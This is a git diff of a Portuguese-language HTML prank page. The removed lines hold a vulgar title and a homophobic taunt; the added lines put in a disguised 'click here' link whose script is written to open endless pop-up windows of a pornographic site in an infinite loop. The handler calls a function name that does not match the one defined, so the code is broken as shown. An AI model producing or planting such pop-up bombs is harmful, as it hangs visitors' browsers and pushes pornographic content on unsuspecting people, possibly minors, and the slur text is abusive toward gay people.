@@ -3,34 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PAU NO SEU CU</title>
+    <title>...s</title>
     <style>
         body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-            flex-direction: column;
             font-family: Arial, sans-serif;
-        }
-        img {
-            max-width: 100%;
-            height: auto;
-        }
-        .message {
-            margin-top: 20px;
-            font-size: 24px;
-            color: #333;
             text-align: center;
+            margin-top: 50px;
+        }
+        a {
+            color: red;
+            text-decoration: underline;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <img src="https://pin.it/5o9Zle5ci.gif" alt="GIF animado">
-    <div class="message">
-        Olá! Você foi redirecionado para esta página.Pq vc é gay tenha um ótimo dia 😊
-    </div>
+    <p>Clique no link abaixo:</p>
+    <a id="popupLink" href="#">Clique aqui</a>
+
+    <script>
+        // Função para abrir pop-ups infinitos
+        function abrirGoogleChrome() {
+            while (true) {
+                window.open("https://www.xvideos.com", "_blank", "width=300,height=300");
+            }
+        }
+
+        // Adiciona um evento de clique ao link
+        document.getElementById("popupLink").addEventListener("click", function(event) {
+            event.preventDefault(); // Impede o comportamento padrão do link
+            abrirPopups(); // Chama a função para abrir pop-ups
+        });
+    </script>
 </body>
 </html>
